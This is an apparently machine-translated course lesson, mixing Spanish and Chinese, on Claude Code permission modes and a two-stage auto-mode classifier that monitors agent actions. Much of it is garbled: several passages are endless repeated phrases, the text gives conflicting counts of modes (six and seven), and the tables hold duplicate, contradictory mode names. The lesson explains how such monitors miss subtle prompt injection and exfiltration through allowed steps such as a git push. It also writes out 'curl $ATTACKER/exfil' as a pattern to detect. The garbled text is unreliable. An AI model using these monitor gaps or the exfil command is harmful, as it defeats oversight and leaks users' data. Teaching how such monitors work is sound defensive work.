# Claude Code como agente autónomo: modos de permiso y modo automático
# Modos de autorización para agentes autónomos

> Una escalera de permiso  niveles graduados de autonomía de revisión-cada acción a aprobar-todo  es cómo un arnés gobierna lo que un agente autónomo puede hacer sin preguntar. Claude Code, el ejemplo de trabajo de esta lección, expone seis de estos modos: "plan" pregunta antes de cada acción, "default" (etiquetado "Manual" en la interfaz de usuario) solo pide para los riesgos, "acceptEdits" autoaprueba archivos escribe pero todavía confirma la ejecución de shell, y "bypassPermissions" aprueba todo. Modo automático  el `auto`El modo de permiso  sustituye la aprobación por acción por un modelo de clasificador separado que revisa cada acción antes de ejecutarla y bloquea cualquier cosa que exceda lo solicitado por la solicitud.`max_turns`y `max_budget_usd`. Disponibilidad de `auto`depende del plan, la habilitación de org, el modelo y el proveedor  y Anthropic es explícito que el clasificador no es suficiente solo.

> **【中文解读】**Claude Code 暴露七个权限模式──"plan" 每动作前询问,"default" 仅对危险动作询问,"acceptEdits" 自动批准文件写入但仍确认 shell 执行,"bypassPermissions" 批准一切──Auto Mode(2026年3月24日) Usó dos fases并行安全分类器替代每动作审核:每动作运行单代币 快速检查;标记动作发发发思链深度审查──动作预算通过`max_turns`Y `max_budget_usd`实施──Auto Mode 作为研究预览发布Antropic 明确声明分类器单独不充分──

> **【拓展：权限阶梯 → 安全分级】**Los siete modelos del Código de Claude son "escalos autónomos":plan → default → acceptEdits → ... → bypassPermissions。 cada modelo es un balance de velocidad y de revisión de cada movimiento。Los dos pasos del Modo de Auto clasifican la aprobación desde el usuario a través de un camino clave (a través de los cuales se puede mover la aprobación a través de la evaluación de la seguridad de los dispositivos), al mismo tiempo que se marca la movimiento para mantener la evaluación de la capa de estudio。 El marco de la preview también refleja la diferencia de evaluación-implementación de los clasificadores evaluados en línea a través de la evaluación de las conversaciones en la reunión real.

> ¿ Qué es esto ?**【前置】**学本节前请先掌握:Fase 15·01(Agentes de largo horizonte) 理解为什么长程 代理人需要权限系统;Fase 14·27(Prompt Injection Defense) 理解为什么 代理人看到的内容不能全信──本节直接讲克劳德码的实际权限模式,是最贴近日常使用的代理安全课──

**Type:** Learn | **类型:** 学习
**Languages:** Python (stdlib, two-stage classifier simulator) | **语言:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape) | **前置知识:** Phase 15 · 01（长程 Agent），Phase 15 · 09（编码 Agent 全景）
**Time:** ~45 minutes | **时间:** ~45 分钟

## El problema es la introducción del problema

> **【中文解读】**El modelo de autorización de Claude Code es un ejemplo típico de control de seguridad de un agente.

> **【拓展：claude code permission modes】**El código de Claude es un código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de

Un agente de codificación autónomo en su máquina es una categoría de seguridad distinta.

> El agente de código autónomo de tu máquina es una categoría de seguridad única.

La superficie de ataque es todo lo que el agente puede llegar  sistema de archivos, red, credenciales, clipboard, cualquier pestaña de navegador, cualquier terminal abierto. Bruce Schneier y otros han señalado esto públicamente: los agentes de uso de computadoras no son una "actualización de características" de chatbots, son un nuevo tipo de herramienta con un nuevo tipo de perfil de riesgo.

> ATAK FACE es el agente que puede tocar todo lo que sea  sistema de documentos, redes, credenciales, tablas de corte, cualquier etiqueta de navegador, cualquier terminal abierto.

El sistema de permisos de Claude Code es la respuesta de Anthropic. En lugar de un interruptor "autónomo / no autónomo", hay seis modos que abarcan una escalera de capacidades: plan → predeterminado → aceptaEdits → ... → bypassPermissions. Cada modo es un cambio diferente entre velocidad y revisión por acción. El modo automático (marzo 2026) agrega un modelo de clasificador separado que aleja la aprobación del camino crítico del usuario: revisa cada acción antes de ejecutarla y bloquea cualquier cosa que se extienda más allá de la solicitud.

> El sistema de derechos de Claude Code es la respuesta de Anthropic. No es un "autónomo/no autónomo" abierto, sino que se transfiere la capacidad de una escalera de siete modos: plan → imprevista → aceptaEdits → ... → bypassPermissions. Cada modelo es velocidad y el peso de cada movimiento revisado.

> ¿ Qué es esto ?**【类比】**El código de Claude 权限模式 = 银行卡额度阶梯──(1) **plan**= Cada笔交易都打电话问你;(2) **default**= "Gran cantidad de transacciones" (en inglés)**acceptEdits**= 储蓄卡(消费自动,转账问);(4) **bypassPermissions (YOLO)**El modo de auto es el modo de uso de los dispositivos de aislamiento, el modo de uso de los dispositivos de aislamiento es el modo de uso de los dispositivos de aislamiento.

> ️ **【易错点】**Claude Code 权限的 3 个致命错误:(1) **本机用 bypassPermissions** Una inyección rápida 就能 rm -rf /; sólo en un recipiente temporal no sensible.**没设 max_budget_usd**Un ciclo de vuelo 1 小时烧50$;务必设 `max_budget_usd=5`起步──(3) **完全信任 Auto Mode 分类器**Antropic 明确说"分类器单独不充分";高危操作(rm、转账、发邮件) debe ser confirmado de nuevo, incluso分类器说安全──


> **【中文解读】**Este capítulo presenta el concepto y el método de realización de un agente de IA. El agente es un sistema autónomo impulsado por el LLM, capaz de observar el medio ambiente, pensar en decisiones, ejecutar acciones y ciclos de generación hasta la finalización de los objetivos.

La pregunta de ingeniería: ¿qué captura este sistema, qué pierde y qué modo realmente justifica una tarea dada?

> 工程问题: ¿Qué captura este sistema, qué pierde, qué determina qué tareas realmente se adaptan a qué modelo?

## El concepto central.

### Los siete modos de permiso.
### Los seis modos de permiso

| Mode | Behavior | When to use |
|---|---|---|
| 模式 | 行为 | 何时使用 |
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `plan` | Agent 提议计划；用户批准整个计划；每动作执行前审查 | 不熟悉任务；接近生产的代码；首次在仓库使用 Agent |
| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `default` | Agent 运行动作；对任何"危险"动作（shell 执行、破坏性操作、网络调用）提示用户 | 多数交互编码会话 |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多文件重构 |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
| `acceptExec` | Shell 命令在策划允许列表内自动批准；写入自动批准 | 每条 shell 命令是 `npm test` 之类的紧密内循环 |
| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
| `autoMode` | 两阶段安全分类器；标记动作升级审查 | 受限工作区中的长程无人值守运行 |
| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
| `yolo` | 跳过多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
| `bypassPermissions` | 批准一切 | 文档定为"仅在你愿意丢弃的临时容器内" |

(Los nombres anteriores coinciden con los documentos públicos del código de Claude; las etiquetas de la interfaz de usuario `default`como "Manual".)

> (上述名称匹配公开 Claude Code 文档;"yolo" es una traducción de la lengua inglesa.

### Modo automático en una página. Modo automático en una página.

El modo automático (lanzado el 24 de marzo de 2026) es el primer modo de permiso para delegar la aprobación por acción a un modelo.

> El modo automático (en inglés Auto Mode) (en inglés Auto Mode) es el primer modo de autorización que se encarga de la aprobación de cada movimiento del modelo.

Estructura:

> 结构:

1. **Stage 1 — single-token classifier.**Se ejecuta en todas las acciones propuestas. Baratas. Retorna "seguro" o "banderas". Diseñado para ejecutarse en paralelo con el bucle principal de agente para que las acciones aprobadas no se sientan en cola.
   En inglés:**阶段 1——单 token 分类器。**En cada propuesta de movimiento se ejecuta en línea.
2. **Stage 2 — secondary policy/safety review.**Se ejecuta solo en acciones marcadas. Realiza una evaluación enfocada de la política y la seguridad sobre la acción, el estado actual de la sesión y la tarea declarada. Escala hasta el HITL del usuario si la confianza es baja.
   En inglés:**阶段 2——二级政策/安全审查。** sólo en el marco de la actividad de la aplicación.  En el marco de la actividad de la reunión.  En el estado actual de la actividad.  En el marco de la evaluación de la seguridad.  En el marco de la evaluación de la actividad de la organización.
1. **A separate classifier model.**Revisa todas las acciones propuestas antes de que se ejecute, juzga en función de la tarea declarada y el estado actual de la sesión, y bloquea cualquier cosa que se extienda más allá de lo que la solicitud pidió.
2. **Gated availability.**¿ Si es que`auto`se ofrece en absoluto depende del plan, la organización de habilidad, el modelo y el proveedor.

Los controles presupuestarios se sitúan junto al clasificador:

>  presupuestario control y clasificación

- `max_turns` Iteraciones totales en una sesión.
  En inglés:`max_turns`会话总代数──
- `max_budget_usd` Cap de dólares que aborta la sesión.
  En inglés:`max_budget_usd` suspender la reunión de dólares 
- límites de número de acciones por instrumento (no más de N `WebFetch`llamadas, etc.).
  Cifrado de la lista de los usuarios de la red de correo electrónico`WebFetch`调用等) ⋅

### Lo que el sistema captura ¿Qué captura el sistema?

- Inyección directa hacia adelante en las entradas de la herramienta donde la instrucción inyectada se asigna a una forma de acción conocida de riesgo.
  En inglés, el nombre de la palabra "input" se refiere a la forma de la palabra "input".
- Los bucles de herramientas repetitivos  el clasificador puede ver que la acción N+1 es casi idéntica a la acción N, cinco veces seguidas.
  En el caso de los grupos de movimientos, el movimiento N+1 es casi el mismo que el movimiento N ⇒ 5 veces.
- Claramente fuera de alcance de los comandos de shell en una sesión de edición de archivos sólo.
  En la edición de documentos en el que se habla, se puede ver claramente más allá del alcance de la shell 命令──

### Lo que el sistema puede perder.

- **Subtle prompt injection**La inyección indirecta de respuesta no es una vulnerabilidad completamente reparable (OpenAI preparación de cabeza, 2025, en los agentes de navegador  ver Lección 11).
  En inglés:**微妙提示注入** En caso de no producirse un solo marcado de movimiento, el comportamiento de modificación.
- **Semantic-level misbehavior.**Cada acción individual puede parecer segura mientras la trayectoria compuesta es perjudicial.
  En inglés:**语义级不当行为。**Cada movimiento individual parece seguro y la trayectoria conjunta es perjudicial.
- **Exfiltration through legitimate channels.**Escribir datos a un archivo que poseas, entonces `git push`El sistema de gestión de las acciones de la Comunidad es una serie de acciones permitidas cuya composición es el problema.
  En inglés:**通过合法渠道泄露。**Escribir datos hasta los archivos que tienes, y luego.`git push`Hasta la almacén pública, es la secuencia de movimientos permitidos, su composición es sólo un problema.

### Enmarcado de la vista previa de la investigación

Anthropic envió el modo automático como una vista previa de investigación. La documentación es explícita en que el clasificador es una capa, no una solución: se espera que los usuarios combinen el modo automático con presupuestos, permisos, espacios de trabajo aislados y auditorías de trayectorias (lecciones 1216). El marco de visualización también refleja la brecha documentada entre evaluación y implementación (lección 1)  un clasificador que pasa evaluaciones fuera de línea puede comportarse de manera diferente en una sesión real donde el contexto del usuario es ambigüo.

> Antropic ha puesto en marcha el modo automático como una investigación preview de la publicación. Documentos definen que el modo de clasificación es una solución y no una solución: se espera que el usuario utilice el modo automático con el presupuesto, permita la lista, la zona de trabajo separada, el control de trayectoria.

### Donde esta escalera vive en tu flujo de trabajo.

- Tarea desconocida: comienza en `plan`Leer el plan es más barato que hacer una mala carrera.
  En español: no conocen`plan`En principio, el programa de trabajo era más barato que el de la carrera.
- Refactor conocido: `acceptEdits`ahorra muchos clics de confirmación.
  El nombre de la ciudad de Nueva York se encuentra en el área de la ciudad.`acceptEdits`Se ha confirmado un gran número de puntos de contacto.
- Ejecución de fondo sin supervisión: `autoMode`sólo dentro de un espacio de trabajo cuyo radio de explosión ha medido (sin credenciales, sin monturas de producción, sin salida en la que no haya optado).
  Sin nadie vale la pena.`autoMode`(sin título, sin producción, sin exportación)
- Contenedores efémeros: `yolo`- ¿ Qué ?`bypassPermissions`es aceptable si y sólo si el contenedor y sus credenciales son desechables.
  En inglés: Temporar.`yolo`- ¿ Qué ?`bypassPermissions`Se puede aceptar y sólo se puede desechar el contenedor y sus credenciales.
- Ejecución de fondo sin supervisión: `auto`sólo dentro de un espacio de trabajo cuyo radio de explosión ha medido (sin credenciales, sin monturas de producción, sin salida en la que no haya optado).
- Contenedores efémeros: `dontAsk`- ¿ Qué ?`bypassPermissions`es aceptable si y sólo si el contenedor y sus credenciales son desechables.

```figure
autonomy-oversight
```

## Usalo con el marco de ejecución

`code/main.py`• la simplificación de la enseñanza; la real `auto`El modo de clasificación está respaldado por un modelo de clasificador separado, no un contrato documentado de dos etapas. La etapa 1 es una regla de palabras clave baratas sobre las acciones propuestas; la etapa 2 es un revisor de reglas múltiples más lento. El conductor alimenta en una trayectoria sintética corta (acciones seguras, un intento de inyección rápida, un bucle repetitivo) y muestra dónde el clasificador atrapa y dónde se pierde.

> `code/main.py`模拟两阶段分类器──阶段 1 es el código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código de código

## Envíe el producto .

`outputs/skill-permission-mode-picker.md`corresponde a la descripción de tareas con el modo de permiso correcto, límites presupuestarios y aislamiento requerido.

> `outputs/skill-permission-mode-picker.md`La descripción de tareas se ajusta a los modelos de límites de poder correctos, límites presupuestarios y separación necesaria.

## Los ejercicios.

1. - ¿ Qué ?`code/main.py`¿Qué tipo de acción sintética nunca es señalada por la Etapa 1 pero siempre captada por la Etapa 2?
   Traducción:运行`code/main.py`¿Qué tipo de movimiento sintético no se ha identificado en la fase 1 pero se ha capturado en la fase 2?

2. Extensión de la regla de la etapa 1 para capturar una forma conocida de mala forma específica (por ejemplo, `curl $ATTACKER/exfil`La tasa de falsos positivos en la muestra de acción benigna se mide.
   La ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de la ley de`curl $ATTACKER/exfil`•■ en el análisis de la actividad positiva, se mide la tasa de falsos positivos.

3. Lea el documento de Anthropic "Cómo funciona el bucle del agente". Enumera todos los estados externos que el agente toca por defecto en `default`¿Cuál es la puerta que necesita para salir por separado antes de correr?`autoMode`¿No está vigilado?
   中文翻译:阅读 Antropic 的"Cómo funciona el bucle del agente"文档──列出 `default`模式下 Agente 默认触及的每一个外部状态――无人值守运行 `autoMode`¿Qué es lo que necesita un control?
3. Lea el documento de Anthropic "Cómo funciona el bucle del agente". Enumera todos los estados externos que el agente toca por defecto en `default`¿Cuál es la puerta que necesita para salir por separado antes de correr?`auto`¿No está vigilado?

4. Diseñar un presupuesto de funcionamiento sin supervisión las 24 horas: `max_turns`¿ Qué ?`max_budget_usd`, por herramienta, los permisos, justificar cada número.
   La obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de la obra de Jesús.`max_turns`¿Qué es esto?`max_budget_usd`、 cada herramienta en la límite 、 permiten la lista 、论证 cada número 、

5. Describa una trayectoria en la que cada acción individual es aprobada por la Etapa 1 y la Etapa 2, pero el comportamiento compuesto está desalineado. (La lección 14 abarca cómo los interruptores de eliminación y los tokens canarios abordan esto).
   China 译文:描述一条轨迹,每个单独动作都被阶段 1 和阶段 2 批准, pero la combinación de comportamientos no está en juego.
5. Describa una trayectoria en la que cada acción individual es aprobada por el clasificador, pero el comportamiento compuesto está desalineado. (La lección 14 abarca cómo los interruptores de eliminación y los tokens canarios abordan esto).

## Términos clave .

| Term | What people say | What it actually means |
|---|---|---|
| 术语 | 通俗说法 | 实际含义 |
| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |
| 权限模式 | "Agent 能做多少" | 控制每动作审批的七种命名策略之一 |
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| plan 模式 | "任何事前询问" | Agent 写计划；用户执行前批准 |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |
| autoMode | "自动批准" | 两阶段安全分类器；标记动作升级 |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |
| 阶段 1 分类器 | "快速 token 检查" | 提议动作上的单 token 规则；并行运行 |
| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |
| 阶段 2 分类器 | "深度审查" | 对标记动作的思维链推理 |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
| 研究预览 | "非 GA" | Anthropic 对失败模式仍在映射的功能的框架 |

## Más Leer más Leer más

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) modos de autorización, presupuestos, formato de acción.
  Traducción:Modeo de autoridad, presupuesto, movimiento.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) Modelo de ejecución de servicios gestionados.
  En inglés, el nombre de la organización es "Manual de gestión".
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) superficie de la función y anuncio de modo automático.
  La versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original de la versión original.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) la capa basada en la razón que da forma a los juicios de los clasificadores.
  La forma en que se forma un orden de juicio basado en la hipótesis.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) perspectiva interna sobre el diseño de permisos de largo horizonte.
  Traducción:Durante el tiempo, el autor de la ley de diseño de la ciudad.
